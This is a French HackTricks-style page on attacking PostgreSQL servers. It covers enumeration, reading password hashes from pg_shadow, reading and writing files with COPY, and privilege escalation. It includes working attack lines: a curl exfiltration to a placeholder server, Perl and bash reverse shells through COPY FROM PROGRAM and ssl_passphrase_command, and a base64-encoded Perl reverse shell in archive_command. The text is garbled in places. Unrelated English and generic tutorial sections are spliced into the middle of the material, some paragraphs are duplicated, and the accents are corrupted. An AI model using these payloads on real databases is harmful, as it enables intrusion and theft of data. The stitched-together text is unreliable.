# 5432,5433 - Pentesting PostgreSQL

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

**PostgreSQL** est un syst√®me de gestion de base de donn√©es relationnelle objet open source qui utilise et √©tend le langage SQL.

**Port par d√©faut :** 5432, et si ce port est d√©j√† utilis√©, il semble que PostgreSQL utilisera le port suivant (probablement 5433) qui n'est pas utilis√©.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connexion et Enum√©ration de base

Pour effectuer une √©num√©ration de base sur un serveur PostgreSQL, vous devez d'abord vous connecter au serveur √† l'aide d'un client PostgreSQL. Vous pouvez utiliser des outils tels que `psql` ou `pgAdmin` pour vous connecter.

### Connexion √† l'aide de `psql`

Pour vous connecter √† un serveur PostgreSQL √† l'aide de `psql`, utilisez la commande suivante :

```bash
psql -h <adresse_IP_serveur> -p <port> -U <utilisateur> -d <base_de_donn√©es>
```

Remplacez `<adresse_IP_serveur>` par l'adresse IP du serveur PostgreSQL, `<port>` par le port sur lequel le serveur √©coute (par d√©faut : 5432), `<utilisateur>` par le nom d'utilisateur et `<base_de_donn√©es>` par le nom de la base de donn√©es √† laquelle vous souhaitez vous connecter.

### Connexion √† l'aide de `pgAdmin`

Pour vous connecter √† un serveur PostgreSQL √† l'aide de `pgAdmin`, suivez les √©tapes suivantes :

1. Lancez `pgAdmin` et cliquez avec le bouton droit sur "Serveurs" dans le volet de gauche.
2. S√©lectionnez "Cr√©er" > "Serveur".
3. Dans l'onglet "G√©n√©ral", donnez un nom au serveur.
4. Dans l'onglet "Connexion", saisissez les informations de connexion, y compris l'adresse IP du serveur, le port, le nom d'utilisateur et le mot de passe.
5. Cliquez sur "Enregistrer" pour ajouter le serveur.
6. Double-cliquez sur le serveur pour vous connecter.

Une fois connect√© au serveur PostgreSQL, vous pouvez commencer √† effectuer une √©num√©ration de base en utilisant des requ√™tes SQL pour r√©cup√©rer des informations sur les bases de donn√©es, les tables, les colonnes, etc.

### √ânum√©ration de base

Voici quelques requ√™tes SQL courantes que vous pouvez utiliser pour effectuer une √©num√©ration de base :

- Pour afficher les bases de donn√©es disponibles :

```sql
SELECT datname FROM pg_database;
```

- Pour afficher les tables dans une base de donn√©es sp√©cifique :

```sql
SELECT tablename FROM pg_tables WHERE schemaname = 'public';
```

- Pour afficher les colonnes d'une table sp√©cifique :

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = '<nom_table>';
```

- Pour afficher les donn√©es d'une table sp√©cifique :

```sql
SELECT * FROM <nom_table>;
```

Ces requ√™tes vous aideront √† obtenir une vue d'ensemble des bases de donn√©es, des tables et des colonnes disponibles sur le serveur PostgreSQL, ce qui peut √™tre utile pour la phase de reconnaissance lors d'un test de p√©n√©tration.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
Select user;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Si vous ex√©cutez **`\list`** et que vous trouvez une base de donn√©es appel√©e **`rdsadmin`**, vous saurez que vous √™tes √† l'int√©rieur d'une base de donn√©es **PostgreSQL AWS**.
{% endhint %}

Pour plus d'informations sur **comment abuser d'une base de donn√©es PostgreSQL**, consultez :

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[injection-postgresql](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## √ânum√©ration automatique
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Scan de ports**

Selon [**cette recherche**](https://www.exploit-db.com/papers/13084), lorsqu'une tentative de connexion √©choue, `dblink` lance une exception `sqlclient_unable_to_establish_sqlconnection` incluant une explication de l'erreur. Des exemples de ces d√©tails sont √©num√©r√©s ci-dessous.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* L'h√¥te est hors ligne

`D√âTAILS : impossible de se connecter au serveur : Aucun chemin d'acc√®s vers l'h√¥te. Le serveur fonctionne-t-il sur l'h√¥te "1.2.3.4" et accepte-t-il les connexions TCP/IP sur le port 5678 ?`

* Le port est ferm√©
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Le port est ouvert
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
# Pentesting PostgreSQL

## Introduction

PostgreSQL is an open-source relational database management system (RDBMS) that is widely used in web applications. As a pentester, it is important to understand how to assess the security of PostgreSQL installations and identify potential vulnerabilities.

## Enumeration

### Version Detection

To determine the version of PostgreSQL running on a target system, you can use the following command:

```bash
nmap -p 5432 --script postgresql-version <target>
```

### User Enumeration

To enumerate the users in a PostgreSQL database, you can use the following SQL query:

```sql
SELECT usename FROM pg_user;
```

### Database Enumeration

To enumerate the databases in a PostgreSQL server, you can use the following SQL query:

```sql
SELECT datname FROM pg_database;
```

## Exploitation

### Default Credentials

PostgreSQL does not have default credentials, but it is common for users to set weak or easily guessable passwords. Therefore, it is important to test for weak credentials during a penetration test.

### SQL Injection

PostgreSQL is vulnerable to SQL injection attacks if user input is not properly sanitized. By injecting malicious SQL code, an attacker can manipulate the database and potentially gain unauthorized access.

### Privilege Escalation

If a user has been granted excessive privileges in a PostgreSQL database, it may be possible to escalate their privileges and gain unauthorized access to sensitive data or perform unauthorized actions.

## Post-Exploitation

### Dumping Data

To dump the contents of a PostgreSQL database, you can use the following command:

```bash
pg_dump -U <username> -d <database> -f <output_file>
```

### Creating Backdoors

After gaining unauthorized access to a PostgreSQL database, an attacker may want to create a backdoor to maintain access in the future. This can be done by creating a new user with administrative privileges or by modifying existing user privileges.

## Conclusion

Pentesting PostgreSQL involves identifying vulnerabilities in the database and exploiting them to gain unauthorized access or perform unauthorized actions. By understanding the enumeration, exploitation, and post-exploitation techniques, you can effectively assess the security of PostgreSQL installations.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Le port est ouvert ou filtr√©
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Malheureusement, il ne semble pas y avoir de moyen d'obtenir les d√©tails de l'exception dans une fonction PL/pgSQL. Mais vous pouvez obtenir les d√©tails si vous pouvez vous connecter directement au serveur PostgreSQL. S'il n'est pas possible d'obtenir les noms d'utilisateur et les mots de passe directement √† partir des tables syst√®me, l'attaque par liste de mots d√©crite dans la section pr√©c√©dente pourrait √™tre couronn√©e de succ√®s.

## √ânum√©ration des privil√®ges

### R√¥les

| Types de r√¥les |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Le r√¥le a des privil√®ges de superutilisateur                                                                                                          |
| rolinherit     | Le r√¥le h√©rite automatiquement des privil√®ges des r√¥les dont il est membre                                                                             |
| rolcreaterole  | Le r√¥le peut cr√©er d'autres r√¥les                                                                                                                     |
| rolcreatedb    | Le r√¥le peut cr√©er des bases de donn√©es                                                                                                                |
| rolcanlogin    | Le r√¥le peut se connecter. C'est-√†-dire que ce r√¥le peut √™tre donn√© en tant qu'identifiant d'autorisation de session initial                          |
| rolreplication | Le r√¥le est un r√¥le de r√©plication. Un r√¥le de r√©plication peut initier des connexions de r√©plication et cr√©er et supprimer des emplacements de r√©plication. |
| rolconnlimit   | Pour les r√¥les pouvant se connecter, cela d√©finit le nombre maximum de connexions simultan√©es que ce r√¥le peut √©tablir. -1 signifie aucune limite.     |
| rolpassword    | Non le mot de passe (toujours affich√© comme `********`)                                                                                                |
| rolvaliduntil  | Heure d'expiration du mot de passe (utilis√©e uniquement pour l'authentification par mot de passe) ; null s'il n'y a pas d'expiration                     |
| rolbypassrls   | Le r√¥le contourne toutes les strat√©gies de s√©curit√© au niveau des lignes, voir [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) pour plus d'informations. |
| rolconfig      | Valeurs par d√©faut sp√©cifiques au r√¥le pour les variables de configuration √† l'ex√©cution                                                             |
| oid            | ID du r√¥le                                                                                                                                           |

#### Groupes int√©ressants

* Si vous √™tes membre de **`pg_execute_server_program`**, vous pouvez **ex√©cuter** des programmes
* Si vous √™tes membre de **`pg_read_server_files`**, vous pouvez **lire** des fichiers
* Si vous √™tes membre de **`pg_write_server_files`**, vous pouvez **√©crire** des fichiers

{% hint style="info" %}
Notez que dans Postgres, un **utilisateur**, un **groupe** et un **r√¥le** sont les **m√™mes**. Cela d√©pend simplement de **comment vous l'utilisez** et si vous **l'autorisez √† se connecter**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tables

Les tables sont des objets fondamentaux dans PostgreSQL. Elles sont utilis√©es pour stocker et organiser les donn√©es de mani√®re structur√©e. Chaque table est compos√©e de colonnes et de lignes.

#### Cr√©ation de tables

Pour cr√©er une table, vous pouvez utiliser la commande `CREATE TABLE`. Voici un exemple de syntaxe :

```sql
CREATE TABLE nom_table (
    nom_colonne1 type_colonne1,
    nom_colonne2 type_colonne2,
    ...
);
```

Remplacez `nom_table` par le nom de votre table, `nom_colonne` par le nom de chaque colonne et `type_colonne` par le type de donn√©es de chaque colonne.

#### Suppression de tables

Pour supprimer une table, vous pouvez utiliser la commande `DROP TABLE`. Voici un exemple de syntaxe :

```sql
DROP TABLE nom_table;
```

Remplacez `nom_table` par le nom de la table que vous souhaitez supprimer.

#### Modification de tables

Pour modifier une table existante, vous pouvez utiliser la commande `ALTER TABLE`. Voici quelques exemples de modifications courantes :

- Ajouter une colonne :

```sql
ALTER TABLE nom_table ADD COLUMN nom_colonne type_colonne;
```

- Supprimer une colonne :

```sql
ALTER TABLE nom_table DROP COLUMN nom_colonne;
```

- Modifier le type de donn√©es d'une colonne :

```sql
ALTER TABLE nom_table ALTER COLUMN nom_colonne TYPE nouveau_type_colonne;
```

Remplacez `nom_table` par le nom de la table que vous souhaitez modifier, `nom_colonne` par le nom de la colonne concern√©e et `nouveau_type_colonne` par le nouveau type de donn√©es.

#### Consultation des tables

Pour consulter les tables existantes dans une base de donn√©es, vous pouvez utiliser la commande `SELECT` avec la clause `FROM`. Voici un exemple de syntaxe :

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'public';
```

Cette requ√™te renverra le nom de toutes les tables pr√©sentes dans le sch√©ma public de la base de donn√©es.

#### Conclusion

Les tables sont des √©l√©ments essentiels dans PostgreSQL pour stocker et organiser les donn√©es. Vous pouvez les cr√©er, les modifier et les supprimer √† l'aide des commandes appropri√©es. Utilisez la commande `SELECT` pour consulter les tables existantes dans une base de donn√©es.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonctions

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be written in various programming languages such as SQL, PL/pgSQL, Python, etc.

Les fonctions dans PostgreSQL sont des blocs de code nomm√©s qui peuvent √™tre ex√©cut√©s en appelant leur nom. Elles sont utilis√©es pour effectuer des t√¢ches sp√©cifiques et peuvent accepter des param√®tres et renvoyer des valeurs. Les fonctions peuvent √™tre cr√©√©es √† l'aide de l'instruction `CREATE FUNCTION` et peuvent √™tre √©crites dans diff√©rents langages de programmation tels que SQL, PL/pgSQL, Python, etc.

### Stored Procedures

Stored procedures are similar to functions, but they do not return a value. They are used to perform a series of actions or operations on the database. Stored procedures can be created using the `CREATE PROCEDURE` statement and can also be written in various programming languages.

Les proc√©dures stock√©es sont similaires aux fonctions, mais elles ne renvoient pas de valeur. Elles sont utilis√©es pour effectuer une s√©rie d'actions ou d'op√©rations sur la base de donn√©es. Les proc√©dures stock√©es peuvent √™tre cr√©√©es √† l'aide de l'instruction `CREATE PROCEDURE` et peuvent √©galement √™tre √©crites dans diff√©rents langages de programmation.

### Triggers

Triggers are special types of functions that are automatically executed when a specific event occurs in the database. They can be used to enforce data integrity, perform auditing, or automate certain tasks. Triggers can be created using the `CREATE TRIGGER` statement and are associated with a specific table or view.

Les d√©clencheurs sont des types sp√©ciaux de fonctions qui sont automatiquement ex√©cut√©es lorsqu'un √©v√©nement sp√©cifique se produit dans la base de donn√©es. Ils peuvent √™tre utilis√©s pour garantir l'int√©grit√© des donn√©es, effectuer des audits ou automatiser certaines t√¢ches. Les d√©clencheurs peuvent √™tre cr√©√©s √† l'aide de l'instruction `CREATE TRIGGER` et sont associ√©s √† une table ou une vue sp√©cifique.

### Views

Views are virtual tables that are based on the result of a query. They provide a way to simplify complex queries and encapsulate logic. Views can be created using the `CREATE VIEW` statement and can be used like regular tables in queries.

Les vues sont des tables virtuelles bas√©es sur le r√©sultat d'une requ√™te. Elles permettent de simplifier les requ√™tes complexes et d'encapsuler la logique. Les vues peuvent √™tre cr√©√©es √† l'aide de l'instruction `CREATE VIEW` et peuvent √™tre utilis√©es comme des tables normales dans les requ√™tes.

### Conclusion

Understanding functions, stored procedures, triggers, and views is essential for effective PostgreSQL database management and development. These database objects provide powerful capabilities for organizing and manipulating data, and can greatly enhance the functionality and efficiency of your applications.

Comprendre les fonctions, les proc√©dures stock√©es, les d√©clencheurs et les vues est essentiel pour une gestion et un d√©veloppement efficaces de la base de donn√©es PostgreSQL. Ces objets de base de donn√©es offrent des fonctionnalit√©s puissantes pour organiser et manipuler les donn√©es, et peuvent grandement am√©liorer la fonctionnalit√© et l'efficacit√© de vos applications.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Actions sur le syst√®me de fichiers

### Lire les r√©pertoires et les fichiers

√Ä partir de ce [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a), les membres du groupe **`DEFAULT_ROLE_READ_SERVER_FILES`** (appel√© **`pg_read_server_files`**) et les **super utilisateurs** peuvent utiliser la m√©thode **`COPY`** sur n'importe quel chemin (consultez `convert_and_check_filename` dans `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
N'oubliez pas que si vous n'√™tes pas un super utilisateur mais que vous avez les permissions **CREATEROLE**, vous pouvez **vous ajouter en tant que membre de ce groupe :**
```sql
GRANT pg_read_server_files TO username;
```
[**Plus d'informations.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Il existe **d'autres fonctions postgres** qui peuvent √™tre utilis√©es pour **lire un fichier ou lister un r√©pertoire**. Seuls les **superutilisateurs** et les **utilisateurs disposant de permissions explicites** peuvent les utiliser :
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Vous pouvez trouver **plus de fonctions** dans [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### √âcriture de fichiers simple

Seuls les **super utilisateurs** et les membres de **`pg_write_server_files`** peuvent utiliser la commande copy pour √©crire des fichiers.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
N'oubliez pas que si vous n'√™tes pas un super utilisateur mais que vous avez les permissions **`CREATEROLE`**, vous pouvez **vous ajouter en tant que membre de ce groupe :**
```sql
GRANT pg_write_server_files TO username;
```
[**Plus d'informations.**](pentesting-postgresql.md#escalade-de-privileges-avec-createrole)
{% endhint %}

N'oubliez pas que COPY ne peut pas g√©rer les caract√®res de saut de ligne, donc m√™me si vous utilisez une charge utile en base64, **vous devez envoyer une seule ligne**.\
Une limitation tr√®s importante de cette technique est que **`copy` ne peut pas √™tre utilis√© pour √©crire des fichiers binaires car il modifie certaines valeurs binaires**.

### **T√©l√©chargement de fichiers binaires**

Cependant, il existe **d'autres techniques pour t√©l√©charger de gros fichiers binaires :**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Astuce pour les primes de bug** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de **primes de bug cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE vers un programme**

Depuis la [version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), seuls les **super utilisateurs** et les membres du groupe **`pg_execute_server_program`** peuvent utiliser copy pour RCE (exemple avec exfiltration :
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemple d'ex√©cution :
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
N'oubliez pas que si vous n'√™tes pas un super utilisateur mais que vous avez les permissions **`CREATEROLE`**, vous pouvez **vous ajouter en tant que membre de ce groupe :**
```sql
GRANT pg_execute_server_program TO username;
```
[**Plus d'informations.**](pentesting-postgresql.md#escalade-de-privileges-avec-createrole)
{% endhint %}

Ou utilisez le module `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Plus d'informations sur cette vuln√©rabilit√© [**ici**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Bien que signal√©e comme CVE-2019-9193, Postges a d√©clar√© qu'il s'agissait d'une [fonctionnalit√© et ne sera pas corrig√©e](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE avec les langages PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE avec les extensions PostgreSQL

Une fois que vous avez **appris** du pr√©c√©dent article **comment t√©l√©charger des fichiers binaires**, vous pouvez essayer d'obtenir **RCE en t√©l√©chargeant une extension PostgreSQL et en la chargeant**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE avec le fichier de configuration PostgreSQL

Le **fichier de configuration** de PostgreSQL est **modifiable** par l'utilisateur **postgres** qui ex√©cute la base de donn√©es, donc en tant que **superutilisateur**, vous pouvez √©crire des fichiers dans le syst√®me de fichiers, et donc vous pouvez **le remplacer**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE avec ssl\_passphrase\_command**

Le fichier de configuration poss√®de certains attributs int√©ressants qui peuvent conduire √† une RCE :

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Chemin de la cl√© priv√©e de la base de donn√©es
* `ssl_passphrase_command = ''` Si le fichier priv√© est prot√©g√© par un mot de passe (crypt√©), PostgreSQL **ex√©cutera la commande indiqu√©e dans cet attribut**.
* `ssl_passphrase_command_supports_reload = off` **Si** cet attribut est **activ√©**, la **commande** ex√©cut√©e si la cl√© est prot√©g√©e par un mot de passe **sera ex√©cut√©e** lorsque `pg_reload_conf()` est **ex√©cut√©**.

Ensuite, un attaquant devra :

1. **Extraire la cl√© priv√©e** du serveur
2. **Crypter** la cl√© priv√©e t√©l√©charg√©e :
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Remplacer**
4. **Extraire** la **configuration** actuelle de PostgreSQL
5. **Remplacer** la **configuration** par la configuration des attributs mentionn√©s :
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Ex√©cuter `pg_reload_conf()`

Lors des tests, j'ai remarqu√© que cela ne fonctionnera que si le **fichier de cl√© priv√©e a les privil√®ges 640**, il est **poss√©d√© par root** et par le **groupe ssl-cert ou postgres** (afin que l'utilisateur postgres puisse le lire), et est plac√© dans _/var/lib/postgresql/12/main_.

**Plus** [**d'informations sur cette technique ici**](https://pulsesecurity.co.nz/articles/postgres-sqli)**.**

#### **RCE avec archive\_command**

Un autre attribut du fichier de configuration qui est exploitable est `archive_command`.

Pour que cela fonctionne, le param√®tre `archive_mode` doit √™tre `'on'` ou `'always'`. Si c'est le cas, nous pouvons remplacer la commande dans `archive_command` et la forcer √† s'ex√©cuter via les op√©rations WAL (write-ahead logging).

Les √©tapes g√©n√©rales sont les suivantes :

1. V√©rifier si le mode archive est activ√© : `SELECT current_setting('archive_mode')`
2. Remplacer `archive_command` par la charge utile. Par exemple, un shell invers√© : `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recharger la configuration : `SELECT pg_reload_conf()`
4. Forcer l'ex√©cution de l'op√©ration WAL, ce qui appellera la commande d'archivage : `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` pour certaines versions de Postgres

**Plus** [**d'informations sur cette configuration et sur WAL ici**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

## **√âl√©vation de privil√®ges Postgres**

### √âl√©vation de privil√®ges CREATEROLE

#### **Accorder**

Selon la [**documentation**](https://www.postgresql.org/docs/13/sql-grant.html) : _Les r√¥les ayant le privil√®ge **`CREATEROLE`** peuvent **accorder ou r√©voquer l'appartenance √† n'importe quel r√¥le** qui n'est pas un **superutilisateur**._

Donc, si vous avez la permission **`CREATEROLE`**, vous pouvez vous accorder l'acc√®s √† d'autres **r√¥les** (qui ne sont pas superutilisateurs) qui peuvent vous donner la possibilit√© de lire et d'√©crire des fichiers et d'ex√©cuter des commandes :
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifier le mot de passe

Les utilisateurs ayant ce r√¥le peuvent √©galement **modifier** les **mots de passe** des autres **non-superutilisateurs** :
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc vers SUPERUSER

Il est assez courant de constater que **les utilisateurs locaux peuvent se connecter √† PostgreSQL sans fournir de mot de passe**. Par cons√©quent, une fois que vous avez obtenu **les autorisations pour ex√©cuter du code**, vous pouvez exploiter ces autorisations pour obtenir le r√¥le de **`SUPERUSER`** :
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Cela est g√©n√©ralement possible en raison des lignes suivantes dans le fichier **`pg_hba.conf`** :
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

Dans [ce **writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities), il est expliqu√© comment il √©tait possible de **privesc** dans Postgres GCP en abusant du privil√®ge ALTER TABLE accord√© √† l'utilisateur.

Lorsque vous essayez de **donner la propri√©t√© d'une table √† un autre utilisateur**, vous devriez obtenir une **erreur** qui l'emp√™che, mais apparemment GCP a donn√© cette **option √† l'utilisateur postgres non-superutilisateur** dans GCP :

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

